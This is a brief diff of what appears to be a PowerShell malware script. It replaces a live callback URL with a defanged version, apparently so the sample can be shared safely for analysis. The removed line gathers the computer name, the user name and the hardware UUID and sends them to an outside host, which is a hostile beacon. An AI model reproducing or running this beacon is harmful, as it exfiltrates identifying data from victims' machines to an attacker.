@@ -17,4 +17,4 @@ function a($u){
 	}
 }
 
-$url="http://t.zz3r0.com/a.jsp?_preex_20210419?"+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join"*");a($url)
+$url="hxxp://t[.]zz3r0[.]com/a.jsp?_preex_20210419?"+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join"*");a($url)
